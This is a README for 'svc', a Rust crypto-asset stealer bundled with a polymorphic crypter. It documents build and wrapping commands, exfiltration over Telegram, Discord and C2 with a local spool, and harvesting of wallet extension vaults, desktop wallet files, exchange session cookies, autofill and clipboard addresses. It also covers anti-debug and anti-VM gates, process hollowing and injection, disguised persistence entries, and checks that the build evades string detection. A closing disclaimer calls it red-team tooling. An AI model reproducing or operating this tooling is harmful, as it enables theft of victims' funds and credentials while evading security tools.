```markdown
# svc — crypto stealer + polymorphic crypter

A Rust workspace containing two things:

1. **`svc-payload`** — a cross-platform crypto-asset stealer. Harvests browser
   extension wallet vaults, desktop wallet files, browser autofill addresses,
   exchange session cookies, and clipboard wallet addresses. Encrypts each
   event and exfiltrates over Telegram / Discord / generic C2 with a local
   disk spool for offline resilience.
2. **`svc-crypter`** — a per-build polymorphic wrapper generator. Takes the
   stealer binary as input and produces a fresh stub binary whose ISA is
   permuted, gates are randomized, decrypt scheme is re-rolled, execution
   method is re-selected, and exfil keys are per-build. No two builds share
   byte layout, function names, or constants.

The two are independent: you can build the stealer and run it, or wrap it
under any number of distinct crypter builds for delivery.

---

## workspace layout

```
crates/
  common/          shared: crypto, sysinfo, exfil, spool, envkey
  payload/         the stealer binary (lib + bin)
  crypter-ir/      StubProgram IR (per-build config record)
  crypter-vm/      randomized ISA + bytecode builder
  crypter-synth/   emits Rust stub source from a StubProgram
  svc-loader/      spawn primitives (memfd / posix_spawn / CreateProcess)
  svc-crypter/     CLI that consumes payload + config → stub binary
```

Everything is `edition = "2021"`, `rust-version = "1.78"`. Release profile
uses `opt-level = "z"`, `lto = "fat"`, `codegen-units = 1`, `panic = "abort"`,
`strip = "symbols"`.

---

## build

### toolchain

```bash
rustup update stable
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-gnu
rustup target add aarch64-apple-darwin
```

### Windows cross-compile from Linux

```bash
sudo apt install -y gcc-mingw-w64-x86-64

export CC_x86_64_pc_windows_gnu=x86_64-w64-mingw32-gcc
export AR_x86_64_pc_windows_gnu=x86_64-w64-mingw32-ar
export CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER=x86_64-w64-mingw32-gcc
```

### compile

```bash
# crypter CLI
cargo build --release -p svc-crypter

# stealer, per target
cargo build --release -p svc-payload --target x86_64-pc-windows-gnu
cargo build --release -p svc-payload --target x86_64-unknown-linux-gnu
cargo build --release -p svc-payload --target aarch64-apple-darwin
```

Payload binaries land in `target/<triple>/release/`.

---

## wrap

```bash
cargo run --release -p svc-crypter -- \
    target/x86_64-pc-windows-gnu/release/svc-payload.exe \
    --target windows \
    --profile stealth \
    --cfg-file ~/.config/svc/secrets.json \
    --directive-file ~/.config/svc/directive.json \
    --out campaign_a
```

Produces:

| path | contents |
|---|---|
| `out/campaign_a/src/main.rs` | emitted stub source |
| `out/campaign_a/Cargo.toml` | per-build cargo manifest |
| `out/campaign_a/campaign_a.exe` | compiled wrapper |
| `out/campaign_a/build.json` | build audit (masked secrets) |

### CLI flags

```
--target windows|linux|macos
--out <name>
--profile stealth|fast|compatible|balanced
--seed <64-hex>          fixed build seed (reproducible builds)
--dry-run                emit stub source only, skip cargo build

--cfg-file <secrets.json>
--directive-file <directive.json>
--tiers t1,t2,...
--persistence entry1,entry2,...
--uninstall              set directive.uninstall = true

--tg-token <TOKEN>       Telegram bot token
--tg-chat  <CHAT_ID>     Telegram chat id
--discord  <WEBHOOK_URL> Discord webhook
--c2       <URL>         generic C2 endpoint
--c2-auth  <BEARER>      C2 bearer token
```

### profiles

| profile | gate set | anti-VM | sleep |
|---|---|---|---|
| `stealth` | all gates, strict RAM/cores/domain | yes | 15–180 s jitter |
| `balanced` | random subset | mostly | 15–180 s jitter |
| `fast` | minimal, no long sleeps | no | short |
| `compatible` | skips anti-VM/hypervisor/parent-dbg | no | 15–180 s |

---

## per-build variation

Every invocation of `svc-crypter` produces a binary that differs in:

| dimension | range |
|---|---|
| ISA opcode permutation | 256-byte shuffle |
| host-call vtable | 16-byte shuffle |
| gate set + order | randomized |
| sleep jitter | 15–180 s |
| debug method | 1 of 6 (`IsDebuggerPresent`, `PEB.BeingDebugged`, `NtGlobalFlag`, `NtQueryInformationProcess`, timing, none) |
| resolver hash | FNV-1a / CRC32 / djb2 / PEB walk |
| decrypt scheme | AES-GCM / ChaCha20-Poly1305 / AES-CBC-HMAC / XOR |
| execution method | ImageMap / ProcessHollow / SpawnInject / DirectJump |
| integrity check | text-section hash / region CRC / none |
| junk density | 0.3–0.7 |
| identifier names | 6–12 random alnum chars |
| exfil key | derived from build seed |
| payload wrapped key | `K = argon2id(salt ‖ seed ‖ sha256(payload))`, `KW = K ⊕ seed ⊕ xor_key` |

Two builds from the same input payload produce binaries with no common
contiguous byte sequences, no shared function names, and different sha256.

---

## exfil

### config delivery

The stub installs `SVC_EXFIL_CFG` (XOR-obfuscated, base64-embedded) before
handing off to the payload. The payload reads it once at startup and
immediately scrubs the variable. The seal key for every envelope is derived
from `SVC_BUILD_SEED`, which the stub also sets and the payload also scrubs.

### envelope

Every event is JSON-encoded, sealed with AES-256-GCM under the per-build
exfil key, base64-encoded, and dispatched:

```json
{
  "tag": "sysinfo|session_tokens|ext_vaults|desktop_vaults|addr_book|clip_addr",
  "ts":  1730000000.0,
  "data": { ... }
}
```

### channels

- **Telegram** — `sendDocument` multipart, caption carries `tag/bytes/host`
- **Discord** — inline message if `< 1800` chars, else file upload
- **C2** — `POST` with `Authorization: Bearer <c2_auth>`

All three are attempted per event. Any success short-circuits the spool.

### spool

Failed sends land in the platform cache dir:

| OS | path |
|---|---|
| Windows | `%TEMP%\svc_spool` |
| Linux | `$XDG_CACHE_HOME/svc_spool` or `~/.cache/svc_spool` or `/tmp/svc_spool` |
| macOS | `~/Library/Caches/svc_spool` |

Entries are retried on next run (`drain_spool` at payload start and end),
with a hard cap of 8 attempts each. Spool size is capped at 512 entries;
oldest are trimmed first.

### rate limiting

120 ms minimum between dispatches, per-process. The clipboard monitor has
its own 1500 ms floor to prevent address-scanning floods.

---

## what the payload collects

| tier | source |
|---|---|
| `sysinfo` | hostname, user, os, arch, cwd, pid, build_id |
| `session` | Chromium-family cookie stores (`Cookies` SQLite) for exchange hosts (Binance, Coinbase, Kraken, KuCoin, Crypto.com, OKX, Bybit, Bitfinex, Gemini, Bitstamp, Gate, Huobi, MetaMask, Phantom, Coinbase Wallet). Decrypted via DPAPI (Windows) / `security` CLI (macOS) / `secret-tool` or `peanuts` fallback (Linux), then AES-256-GCM for `v10`/`v11` blobs. |
| `ext` | Chromium extension `Local Extension Settings/<id>` LevelDB for 20 known wallet extensions (MetaMask, MetaMask-Flask, BinanceChain, Trust, Coinbase Wallet, Phantom, Keplr, Sui, OKX, Rabby, TronLink, XDEFI, Talisman, Exodus Web, BitKeep, Math, Wombat, Kaikas, KardiaChain, Enkrypt). Raw LevelDB fragments and regex hits (BIP-39 12/24, ETH priv, BTC WIF, hex64) are exfiltrated base64-encoded. |
| `desktop` | Exodus, Electrum, Atomic, Bitcoin/Litecoin/Dogecoin Core, Monero GUI, Zcash, Ledger Live, Trezor Suite, Sparrow, Wasabi, Daedalus, Yoroi, Coinomi, Guarda — recursively walked, files with wallet-relevant extensions captured up to 2 MB each |
| `addr` | Chromium `Web Data` SQLite `autofill` table rows matching `0x…`, `bc1…`, `1…`, `3…`, `4…`, `8…` (BTC/ETH/TRX/XRP shapes) |
| `clip` | clipboard polled every 2 s; any string passing `is_wallet_addr` is exfiltrated. Deduplicated in a 16-entry ring buffer. |

---

## directives

`SVC_DIRECTIVE` is set by the stub before handing off to the payload. The
payload reads it once at startup and scrubs the variable.

```json
{
  "tiers": ["session", "ext", "desktop", "addr", "clip"],
  "persistence": ["runkey", "startup", "schtask"],
  "uninstall": false,
  "rate_limit_ms": 0
}
```

- Empty `tiers` = run all tiers.
- Empty `persistence` = install nothing.
- `rate_limit_ms` currently advisory.

### persistence entries by platform

| entry | Windows | Linux | macOS |
|---|---|---|---|
| `runkey` | `HKCU\...\Run\WinHostSvc<tag>` | — | — |
| `startup` | copy to user Startup folder | — | — |
| `schtask` | `schtasks /Create /SC ONLOGON` | — | — |
| `systemd_user` | — | `~/.config/systemd/user/svc_<tag>.service` | — |
| `cron` | — | `~/.config/autostart_svc_<tag>` | — |
| `rc_local` | — | append to `/etc/rc.local` | — |
| `launchagent` | — | — | `~/Library/LaunchAgents/com.apple.helper.<tag>.plist` |
| `login_item` | — | — | `osascript` login item |

---

## uninstall

Re-run the payload with the directive flag set:

```json
{ "uninstall": true, "persistence": ["runkey", "startup", "schtask"] }
```

Every listed persistence mechanism is reversed. Existing entries created by
prior runs with different `<tag>` suffixes for `systemd_user` and
`launchagent` are swept by prefix match.

---

## verification

```bash
# no cleartext secrets survive in the wrapper
strings out/campaign_a/campaign_a.exe | grep -iE "sandbox|telegram|webhook|api.telegram" | head

# two builds of the same payload differ
cargo run --release -p svc-crypter -- payload.exe --out a
cargo run --release -p svc-crypter -- payload.exe --out b
sha256sum out/a/a.exe out/b/b.exe    # different
cmp out/a/a.exe out/b/b.exe          # differ
```

---

## note

Built for authorized red team engagements and personal lab use. The stealer
harvests real credentials and the crypter is designed to evade detection.
Do not run on systems you do not own or do not have explicit written
authorization to test.

The wrapper's secret-loading path prints a warning if the secrets file is
group- or world-readable on Unix. Use `chmod 600 ~/.config/svc/secrets.json`.
```
